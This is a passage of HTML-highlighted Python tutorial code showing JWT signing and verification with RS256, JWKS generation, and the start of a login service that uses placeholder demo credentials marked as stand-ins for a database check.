<a id="__codelineno-18-136" name="__codelineno-18-136" href="#__codelineno-18-136"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Role: </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">][</span><span class="s1">&#39;role&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-18-137" name="__codelineno-18-137" href="#__codelineno-18-137"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Expires: </span><span class="si">{</span><span class="n">datetime</span><span class="o">.</span><span class="n">fromtimestamp</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">][</span><span class="s1">&#39;exp&#39;</span><span class="p">])</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-18-138" name="__codelineno-18-138" href="#__codelineno-18-138"></a>
<a id="__codelineno-18-139" name="__codelineno-18-139" href="#__codelineno-18-139"></a>
<a id="__codelineno-18-140" name="__codelineno-18-140" href="#__codelineno-18-140"></a><span class="c1"># ============================================================</span>
<a id="__codelineno-18-141" name="__codelineno-18-141" href="#__codelineno-18-141"></a><span class="c1"># 2. RSA (RS256) - Asymmetric Signing</span>
<a id="__codelineno-18-142" name="__codelineno-18-142" href="#__codelineno-18-142"></a><span class="c1"># ============================================================</span>
<a id="__codelineno-18-143" name="__codelineno-18-143" href="#__codelineno-18-143"></a>
<a id="__codelineno-18-144" name="__codelineno-18-144" href="#__codelineno-18-144"></a><span class="k">class</span><span class="w"> </span><span class="nc">JWTServiceRS256</span><span class="p">:</span>
<a id="__codelineno-18-145" name="__codelineno-18-145" href="#__codelineno-18-145"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;JWT service using RSA-SHA256 (asymmetric)&quot;&quot;&quot;</span>
<a id="__codelineno-18-146" name="__codelineno-18-146" href="#__codelineno-18-146"></a>
<a id="__codelineno-18-147" name="__codelineno-18-147" href="#__codelineno-18-147"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<a id="__codelineno-18-148" name="__codelineno-18-148" href="#__codelineno-18-148"></a>        <span class="c1"># Generate RSA key pair</span>
<a id="__codelineno-18-149" name="__codelineno-18-149" href="#__codelineno-18-149"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">private_key</span> <span class="o">=</span> <span class="n">rsa</span><span class="o">.</span><span class="n">generate_private_key</span><span class="p">(</span>
<a id="__codelineno-18-150" name="__codelineno-18-150" href="#__codelineno-18-150"></a>            <span class="n">public_exponent</span><span class="o">=</span><span class="mi">65537</span><span class="p">,</span>
<a id="__codelineno-18-151" name="__codelineno-18-151" href="#__codelineno-18-151"></a>            <span class="n">key_size</span><span class="o">=</span><span class="mi">2048</span><span class="p">,</span>
<a id="__codelineno-18-152" name="__codelineno-18-152" href="#__codelineno-18-152"></a>            <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">()</span>
<a id="__codelineno-18-153" name="__codelineno-18-153" href="#__codelineno-18-153"></a>        <span class="p">)</span>
<a id="__codelineno-18-154" name="__codelineno-18-154" href="#__codelineno-18-154"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">public_key</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">private_key</span><span class="o">.</span><span class="n">public_key</span><span class="p">()</span>
<a id="__codelineno-18-155" name="__codelineno-18-155" href="#__codelineno-18-155"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">algorithm</span> <span class="o">=</span> <span class="s2">&quot;RS256&quot;</span>
<a id="__codelineno-18-156" name="__codelineno-18-156" href="#__codelineno-18-156"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">kid</span> <span class="o">=</span> <span class="s2">&quot;key-2024-01&quot;</span>
<a id="__codelineno-18-157" name="__codelineno-18-157" href="#__codelineno-18-157"></a>
<a id="__codelineno-18-158" name="__codelineno-18-158" href="#__codelineno-18-158"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">create_token</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">email</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> 
<a id="__codelineno-18-159" name="__codelineno-18-159" href="#__codelineno-18-159"></a>                    <span class="n">role</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="n">expires_in</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">3600</span><span class="p">):</span>
<a id="__codelineno-18-160" name="__codelineno-18-160" href="#__codelineno-18-160"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Create JWT with RSA signature&quot;&quot;&quot;</span>
<a id="__codelineno-18-161" name="__codelineno-18-161" href="#__codelineno-18-161"></a>        <span class="n">now</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span>
<a id="__codelineno-18-162" name="__codelineno-18-162" href="#__codelineno-18-162"></a>
<a id="__codelineno-18-163" name="__codelineno-18-163" href="#__codelineno-18-163"></a>        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-18-164" name="__codelineno-18-164" href="#__codelineno-18-164"></a>            <span class="s2">&quot;iss&quot;</span><span class="p">:</span> <span class="s2">&quot;https://auth.myapp.com&quot;</span><span class="p">,</span>
<a id="__codelineno-18-165" name="__codelineno-18-165" href="#__codelineno-18-165"></a>            <span class="s2">&quot;sub&quot;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>
<a id="__codelineno-18-166" name="__codelineno-18-166" href="#__codelineno-18-166"></a>            <span class="s2">&quot;aud&quot;</span><span class="p">:</span> <span class="s2">&quot;https://api.myapp.com&quot;</span><span class="p">,</span>
<a id="__codelineno-18-167" name="__codelineno-18-167" href="#__codelineno-18-167"></a>            <span class="s2">&quot;exp&quot;</span><span class="p">:</span> <span class="n">now</span> <span class="o">+</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="n">expires_in</span><span class="p">),</span>
<a id="__codelineno-18-168" name="__codelineno-18-168" href="#__codelineno-18-168"></a>            <span class="s2">&quot;iat&quot;</span><span class="p">:</span> <span class="n">now</span><span class="p">,</span>
<a id="__codelineno-18-169" name="__codelineno-18-169" href="#__codelineno-18-169"></a>            <span class="s2">&quot;email&quot;</span><span class="p">:</span> <span class="n">email</span><span class="p">,</span>
<a id="__codelineno-18-170" name="__codelineno-18-170" href="#__codelineno-18-170"></a>            <span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="n">role</span>
<a id="__codelineno-18-171" name="__codelineno-18-171" href="#__codelineno-18-171"></a>        <span class="p">}</span>
<a id="__codelineno-18-172" name="__codelineno-18-172" href="#__codelineno-18-172"></a>
<a id="__codelineno-18-173" name="__codelineno-18-173" href="#__codelineno-18-173"></a>        <span class="c1"># Add kid to header</span>
<a id="__codelineno-18-174" name="__codelineno-18-174" href="#__codelineno-18-174"></a>        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;kid&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">kid</span><span class="p">}</span>
<a id="__codelineno-18-175" name="__codelineno-18-175" href="#__codelineno-18-175"></a>
<a id="__codelineno-18-176" name="__codelineno-18-176" href="#__codelineno-18-176"></a>        <span class="c1"># Sign with private key</span>
<a id="__codelineno-18-177" name="__codelineno-18-177" href="#__codelineno-18-177"></a>        <span class="n">private_pem</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">private_key</span><span class="o">.</span><span class="n">private_bytes</span><span class="p">(</span>
<a id="__codelineno-18-178" name="__codelineno-18-178" href="#__codelineno-18-178"></a>            <span class="n">encoding</span><span class="o">=</span><span class="n">serialization</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">PEM</span><span class="p">,</span>
<a id="__codelineno-18-179" name="__codelineno-18-179" href="#__codelineno-18-179"></a>            <span class="nb">format</span><span class="o">=</span><span class="n">serialization</span><span class="o">.</span><span class="n">PrivateFormat</span><span class="o">.</span><span class="n">PKCS8</span><span class="p">,</span>
<a id="__codelineno-18-180" name="__codelineno-18-180" href="#__codelineno-18-180"></a>            <span class="n">encryption_algorithm</span><span class="o">=</span><span class="n">serialization</span><span class="o">.</span><span class="n">NoEncryption</span><span class="p">()</span>
<a id="__codelineno-18-181" name="__codelineno-18-181" href="#__codelineno-18-181"></a>        <span class="p">)</span>
<a id="__codelineno-18-182" name="__codelineno-18-182" href="#__codelineno-18-182"></a>
<a id="__codelineno-18-183" name="__codelineno-18-183" href="#__codelineno-18-183"></a>        <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span>
<a id="__codelineno-18-184" name="__codelineno-18-184" href="#__codelineno-18-184"></a>            <span class="n">payload</span><span class="p">,</span>
<a id="__codelineno-18-185" name="__codelineno-18-185" href="#__codelineno-18-185"></a>            <span class="n">private_pem</span><span class="p">,</span>
<a id="__codelineno-18-186" name="__codelineno-18-186" href="#__codelineno-18-186"></a>            <span class="n">algorithm</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">algorithm</span><span class="p">,</span>
<a id="__codelineno-18-187" name="__codelineno-18-187" href="#__codelineno-18-187"></a>            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span>
<a id="__codelineno-18-188" name="__codelineno-18-188" href="#__codelineno-18-188"></a>        <span class="p">)</span>
<a id="__codelineno-18-189" name="__codelineno-18-189" href="#__codelineno-18-189"></a>
<a id="__codelineno-18-190" name="__codelineno-18-190" href="#__codelineno-18-190"></a>        <span class="k">return</span> <span class="n">token</span>
<a id="__codelineno-18-191" name="__codelineno-18-191" href="#__codelineno-18-191"></a>
<a id="__codelineno-18-192" name="__codelineno-18-192" href="#__codelineno-18-192"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">verify_token</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<a id="__codelineno-18-193" name="__codelineno-18-193" href="#__codelineno-18-193"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Verify JWT with public key&quot;&quot;&quot;</span>
<a id="__codelineno-18-194" name="__codelineno-18-194" href="#__codelineno-18-194"></a>        <span class="k">try</span><span class="p">:</span>
<a id="__codelineno-18-195" name="__codelineno-18-195" href="#__codelineno-18-195"></a>            <span class="c1"># Get public key PEM</span>
<a id="__codelineno-18-196" name="__codelineno-18-196" href="#__codelineno-18-196"></a>            <span class="n">public_pem</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">public_key</span><span class="o">.</span><span class="n">public_bytes</span><span class="p">(</span>
<a id="__codelineno-18-197" name="__codelineno-18-197" href="#__codelineno-18-197"></a>                <span class="n">encoding</span><span class="o">=</span><span class="n">serialization</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">PEM</span><span class="p">,</span>
<a id="__codelineno-18-198" name="__codelineno-18-198" href="#__codelineno-18-198"></a>                <span class="nb">format</span><span class="o">=</span><span class="n">serialization</span><span class="o">.</span><span class="n">PublicFormat</span><span class="o">.</span><span class="n">SubjectPublicKeyInfo</span>
<a id="__codelineno-18-199" name="__codelineno-18-199" href="#__codelineno-18-199"></a>            <span class="p">)</span>
<a id="__codelineno-18-200" name="__codelineno-18-200" href="#__codelineno-18-200"></a>
<a id="__codelineno-18-201" name="__codelineno-18-201" href="#__codelineno-18-201"></a>            <span class="c1"># Verify with public key</span>
<a id="__codelineno-18-202" name="__codelineno-18-202" href="#__codelineno-18-202"></a>            <span class="n">payload</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span>
<a id="__codelineno-18-203" name="__codelineno-18-203" href="#__codelineno-18-203"></a>                <span class="n">token</span><span class="p">,</span>
<a id="__codelineno-18-204" name="__codelineno-18-204" href="#__codelineno-18-204"></a>                <span class="n">public_pem</span><span class="p">,</span>
<a id="__codelineno-18-205" name="__codelineno-18-205" href="#__codelineno-18-205"></a>                <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">algorithm</span><span class="p">]</span>
<a id="__codelineno-18-206" name="__codelineno-18-206" href="#__codelineno-18-206"></a>            <span class="p">)</span>
<a id="__codelineno-18-207" name="__codelineno-18-207" href="#__codelineno-18-207"></a>
<a id="__codelineno-18-208" name="__codelineno-18-208" href="#__codelineno-18-208"></a>            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;valid&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;payload&quot;</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
<a id="__codelineno-18-209" name="__codelineno-18-209" href="#__codelineno-18-209"></a>
<a id="__codelineno-18-210" name="__codelineno-18-210" href="#__codelineno-18-210"></a>        <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">InvalidTokenError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
<a id="__codelineno-18-211" name="__codelineno-18-211" href="#__codelineno-18-211"></a>            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;valid&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)}</span>
<a id="__codelineno-18-212" name="__codelineno-18-212" href="#__codelineno-18-212"></a>
<a id="__codelineno-18-213" name="__codelineno-18-213" href="#__codelineno-18-213"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">get_jwks</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<a id="__codelineno-18-214" name="__codelineno-18-214" href="#__codelineno-18-214"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Generate JWKS (JSON Web Key Set)&quot;&quot;&quot;</span>
<a id="__codelineno-18-215" name="__codelineno-18-215" href="#__codelineno-18-215"></a>        <span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives.asymmetric</span><span class="w"> </span><span class="kn">import</span> <span class="n">rsa</span>
<a id="__codelineno-18-216" name="__codelineno-18-216" href="#__codelineno-18-216"></a>
<a id="__codelineno-18-217" name="__codelineno-18-217" href="#__codelineno-18-217"></a>        <span class="c1"># Get public key numbers</span>
<a id="__codelineno-18-218" name="__codelineno-18-218" href="#__codelineno-18-218"></a>        <span class="n">public_numbers</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">public_key</span><span class="o">.</span><span class="n">public_numbers</span><span class="p">()</span>
<a id="__codelineno-18-219" name="__codelineno-18-219" href="#__codelineno-18-219"></a>
<a id="__codelineno-18-220" name="__codelineno-18-220" href="#__codelineno-18-220"></a>        <span class="c1"># Convert to base64url</span>
<a id="__codelineno-18-221" name="__codelineno-18-221" href="#__codelineno-18-221"></a>        <span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<a id="__codelineno-18-222" name="__codelineno-18-222" href="#__codelineno-18-222"></a>
<a id="__codelineno-18-223" name="__codelineno-18-223" href="#__codelineno-18-223"></a>        <span class="k">def</span><span class="w"> </span><span class="nf">int_to_base64url</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
<a id="__codelineno-18-224" name="__codelineno-18-224" href="#__codelineno-18-224"></a><span class="w">            </span><span class="sd">&quot;&quot;&quot;Convert integer to base64url&quot;&quot;&quot;</span>
<a id="__codelineno-18-225" name="__codelineno-18-225" href="#__codelineno-18-225"></a>            <span class="n">num_bytes</span> <span class="o">=</span> <span class="n">num</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">((</span><span class="n">num</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
<a id="__codelineno-18-226" name="__codelineno-18-226" href="#__codelineno-18-226"></a>            <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">num_bytes</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)</span>
<a id="__codelineno-18-227" name="__codelineno-18-227" href="#__codelineno-18-227"></a>
<a id="__codelineno-18-228" name="__codelineno-18-228" href="#__codelineno-18-228"></a>        <span class="n">jwks</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-18-229" name="__codelineno-18-229" href="#__codelineno-18-229"></a>            <span class="s2">&quot;keys&quot;</span><span class="p">:</span> <span class="p">[</span>
<a id="__codelineno-18-230" name="__codelineno-18-230" href="#__codelineno-18-230"></a>                <span class="p">{</span>
<a id="__codelineno-18-231" name="__codelineno-18-231" href="#__codelineno-18-231"></a>                    <span class="s2">&quot;kty&quot;</span><span class="p">:</span> <span class="s2">&quot;RSA&quot;</span><span class="p">,</span>
<a id="__codelineno-18-232" name="__codelineno-18-232" href="#__codelineno-18-232"></a>                    <span class="s2">&quot;use&quot;</span><span class="p">:</span> <span class="s2">&quot;sig&quot;</span><span class="p">,</span>
<a id="__codelineno-18-233" name="__codelineno-18-233" href="#__codelineno-18-233"></a>                    <span class="s2">&quot;kid&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">kid</span><span class="p">,</span>
<a id="__codelineno-18-234" name="__codelineno-18-234" href="#__codelineno-18-234"></a>                    <span class="s2">&quot;alg&quot;</span><span class="p">:</span> <span class="s2">&quot;RS256&quot;</span><span class="p">,</span>
<a id="__codelineno-18-235" name="__codelineno-18-235" href="#__codelineno-18-235"></a>                    <span class="s2">&quot;n&quot;</span><span class="p">:</span> <span class="n">int_to_base64url</span><span class="p">(</span><span class="n">public_numbers</span><span class="o">.</span><span class="n">n</span><span class="p">),</span>
<a id="__codelineno-18-236" name="__codelineno-18-236" href="#__codelineno-18-236"></a>                    <span class="s2">&quot;e&quot;</span><span class="p">:</span> <span class="n">int_to_base64url</span><span class="p">(</span><span class="n">public_numbers</span><span class="o">.</span><span class="n">e</span><span class="p">)</span>
<a id="__codelineno-18-237" name="__codelineno-18-237" href="#__codelineno-18-237"></a>                <span class="p">}</span>
<a id="__codelineno-18-238" name="__codelineno-18-238" href="#__codelineno-18-238"></a>            <span class="p">]</span>
<a id="__codelineno-18-239" name="__codelineno-18-239" href="#__codelineno-18-239"></a>        <span class="p">}</span>
<a id="__codelineno-18-240" name="__codelineno-18-240" href="#__codelineno-18-240"></a>
<a id="__codelineno-18-241" name="__codelineno-18-241" href="#__codelineno-18-241"></a>        <span class="k">return</span> <span class="n">jwks</span>
<a id="__codelineno-18-242" name="__codelineno-18-242" href="#__codelineno-18-242"></a>
<a id="__codelineno-18-243" name="__codelineno-18-243" href="#__codelineno-18-243"></a>
<a id="__codelineno-18-244" name="__codelineno-18-244" href="#__codelineno-18-244"></a><span class="c1"># Example Usage: RS256</span>
<a id="__codelineno-18-245" name="__codelineno-18-245" href="#__codelineno-18-245"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
<a id="__codelineno-18-246" name="__codelineno-18-246" href="#__codelineno-18-246"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;RSA-SHA256 (RS256) Example&quot;</span><span class="p">)</span>
<a id="__codelineno-18-247" name="__codelineno-18-247" href="#__codelineno-18-247"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
<a id="__codelineno-18-248" name="__codelineno-18-248" href="#__codelineno-18-248"></a>
<a id="__codelineno-18-249" name="__codelineno-18-249" href="#__codelineno-18-249"></a><span class="n">jwt_service_rsa</span> <span class="o">=</span> <span class="n">JWTServiceRS256</span><span class="p">()</span>
<a id="__codelineno-18-250" name="__codelineno-18-250" href="#__codelineno-18-250"></a>
<a id="__codelineno-18-251" name="__codelineno-18-251" href="#__codelineno-18-251"></a><span class="c1"># Create token</span>
<a id="__codelineno-18-252" name="__codelineno-18-252" href="#__codelineno-18-252"></a><span class="n">token_rsa</span> <span class="o">=</span> <span class="n">jwt_service_rsa</span><span class="o">.</span><span class="n">create_token</span><span class="p">(</span>
<a id="__codelineno-18-253" name="__codelineno-18-253" href="#__codelineno-18-253"></a>    <span class="n">user_id</span><span class="o">=</span><span class="s2">&quot;user_67890&quot;</span><span class="p">,</span>
<a id="__codelineno-18-254" name="__codelineno-18-254" href="#__codelineno-18-254"></a>    <span class="n">email</span><span class="o">=</span><span class="s2">&quot;alice@example.com&quot;</span><span class="p">,</span>
<a id="__codelineno-18-255" name="__codelineno-18-255" href="#__codelineno-18-255"></a>    <span class="n">role</span><span class="o">=</span><span class="s2">&quot;user&quot;</span><span class="p">,</span>
<a id="__codelineno-18-256" name="__codelineno-18-256" href="#__codelineno-18-256"></a>    <span class="n">expires_in</span><span class="o">=</span><span class="mi">7200</span>  <span class="c1"># 2 hours</span>
<a id="__codelineno-18-257" name="__codelineno-18-257" href="#__codelineno-18-257"></a><span class="p">)</span>
<a id="__codelineno-18-258" name="__codelineno-18-258" href="#__codelineno-18-258"></a>
<a id="__codelineno-18-259" name="__codelineno-18-259" href="#__codelineno-18-259"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2"> Generated JWT (RS256):</span><span class="se">\n</span><span class="si">{</span><span class="n">token_rsa</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-18-260" name="__codelineno-18-260" href="#__codelineno-18-260"></a>
<a id="__codelineno-18-261" name="__codelineno-18-261" href="#__codelineno-18-261"></a><span class="c1"># Verify token</span>
<a id="__codelineno-18-262" name="__codelineno-18-262" href="#__codelineno-18-262"></a><span class="n">result_rsa</span> <span class="o">=</span> <span class="n">jwt_service_rsa</span><span class="o">.</span><span class="n">verify_token</span><span class="p">(</span><span class="n">token_rsa</span><span class="p">)</span>
<a id="__codelineno-18-263" name="__codelineno-18-263" href="#__codelineno-18-263"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot; Verification Result:&quot;</span><span class="p">)</span>
<a id="__codelineno-18-264" name="__codelineno-18-264" href="#__codelineno-18-264"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Valid: </span><span class="si">{</span><span class="n">result_rsa</span><span class="p">[</span><span class="s1">&#39;valid&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-18-265" name="__codelineno-18-265" href="#__codelineno-18-265"></a><span class="k">if</span> <span class="n">result_rsa</span><span class="p">[</span><span class="s1">&#39;valid&#39;</span><span class="p">]:</span>
<a id="__codelineno-18-266" name="__codelineno-18-266" href="#__codelineno-18-266"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;User ID: </span><span class="si">{</span><span class="n">result_rsa</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">][</span><span class="s1">&#39;sub&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-18-267" name="__codelineno-18-267" href="#__codelineno-18-267"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Email: </span><span class="si">{</span><span class="n">result_rsa</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">][</span><span class="s1">&#39;email&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-18-268" name="__codelineno-18-268" href="#__codelineno-18-268"></a>
<a id="__codelineno-18-269" name="__codelineno-18-269" href="#__codelineno-18-269"></a><span class="c1"># Get JWKS</span>
<a id="__codelineno-18-270" name="__codelineno-18-270" href="#__codelineno-18-270"></a><span class="n">jwks</span> <span class="o">=</span> <span class="n">jwt_service_rsa</span><span class="o">.</span><span class="n">get_jwks</span><span class="p">()</span>
<a id="__codelineno-18-271" name="__codelineno-18-271" href="#__codelineno-18-271"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2"> JWKS (Public Key Set):&quot;</span><span class="p">)</span>
<a id="__codelineno-18-272" name="__codelineno-18-272" href="#__codelineno-18-272"></a><span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">jwks</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">))</span>
<a id="__codelineno-18-273" name="__codelineno-18-273" href="#__codelineno-18-273"></a>
<a id="__codelineno-18-274" name="__codelineno-18-274" href="#__codelineno-18-274"></a>
<a id="__codelineno-18-275" name="__codelineno-18-275" href="#__codelineno-18-275"></a><span class="c1"># ============================================================</span>
<a id="__codelineno-18-276" name="__codelineno-18-276" href="#__codelineno-18-276"></a><span class="c1"># 3. Complete Authentication System</span>
<a id="__codelineno-18-277" name="__codelineno-18-277" href="#__codelineno-18-277"></a><span class="c1"># ============================================================</span>
<a id="__codelineno-18-278" name="__codelineno-18-278" href="#__codelineno-18-278"></a>
<a id="__codelineno-18-279" name="__codelineno-18-279" href="#__codelineno-18-279"></a><span class="k">class</span><span class="w"> </span><span class="nc">AuthenticationService</span><span class="p">:</span>
<a id="__codelineno-18-280" name="__codelineno-18-280" href="#__codelineno-18-280"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Complete authentication service with JWT&quot;&quot;&quot;</span>
<a id="__codelineno-18-281" name="__codelineno-18-281" href="#__codelineno-18-281"></a>
<a id="__codelineno-18-282" name="__codelineno-18-282" href="#__codelineno-18-282"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<a id="__codelineno-18-283" name="__codelineno-18-283" href="#__codelineno-18-283"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">jwt_service</span> <span class="o">=</span> <span class="n">JWTServiceHS256</span><span class="p">(</span><span class="n">secret_key</span><span class="p">)</span>
<a id="__codelineno-18-284" name="__codelineno-18-284" href="#__codelineno-18-284"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">refresh_tokens</span> <span class="o">=</span> <span class="p">{}</span>  <span class="c1"># In production, use Redis/DB</span>
<a id="__codelineno-18-285" name="__codelineno-18-285" href="#__codelineno-18-285"></a>
<a id="__codelineno-18-286" name="__codelineno-18-286" href="#__codelineno-18-286"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<a id="__codelineno-18-287" name="__codelineno-18-287" href="#__codelineno-18-287"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<a id="__codelineno-18-288" name="__codelineno-18-288" href="#__codelineno-18-288"></a><span class="sd">        Authenticate user and return tokens.</span>
<a id="__codelineno-18-289" name="__codelineno-18-289" href="#__codelineno-18-289"></a>
<a id="__codelineno-18-290" name="__codelineno-18-290" href="#__codelineno-18-290"></a><span class="sd">        Returns:</span>
<a id="__codelineno-18-291" name="__codelineno-18-291" href="#__codelineno-18-291"></a><span class="sd">            dict with access_token and refresh_token</span>
<a id="__codelineno-18-292" name="__codelineno-18-292" href="#__codelineno-18-292"></a><span class="sd">        &quot;&quot;&quot;</span>
<a id="__codelineno-18-293" name="__codelineno-18-293" href="#__codelineno-18-293"></a>        <span class="c1"># In production: verify against database</span>
<a id="__codelineno-18-294" name="__codelineno-18-294" href="#__codelineno-18-294"></a>        <span class="k">if</span> <span class="n">username</span> <span class="o">==</span> <span class="s2">&quot;admin&quot;</span> <span class="ow">and</span> <span class="n">password</span> <span class="o">==</span> <span class="s2">&quot;admin123&quot;</span><span class="p">:</span>
<a id="__codelineno-18-295" name="__codelineno-18-295" href="#__codelineno-18-295"></a>            <span class="n">user_id</span> <span class="o">=</span> <span class="s2">&quot;user_001&quot;</span>
<a id="__codelineno-18-296" name="__codelineno-18-296" href="#__codelineno-18-296"></a>            <span class="n">email</span> <span class="o">=</span> <span class="s2">&quot;admin@example.com&quot;</span>
<a id="__codelineno-18-297" name="__codelineno-18-297" href="#__codelineno-18-297"></a>            <span class="n">role</span> <span class="o">=</span> <span class="s2">&quot;admin&quot;</span>
<a id="__codelineno-18-298" name="__codelineno-18-298" href="#__codelineno-18-298"></a>        <span class="k">elif</span> <span class="n">username</span> <span class="o">==</span> <span class="s2">&quot;user&quot;</span> <span class="ow">and</span> <span class="n">password</span> <span class="o">==</span> <span class="s2">&quot;user123&quot;</span><span class="p">:</span>
<a id="__codelineno-18-299" name="__codelineno-18-299" href="#__codelineno-18-299"></a>            <span class="n">user_id</span> <span class="o">=</span> <span class="s2">&quot;user_002&quot;</span>
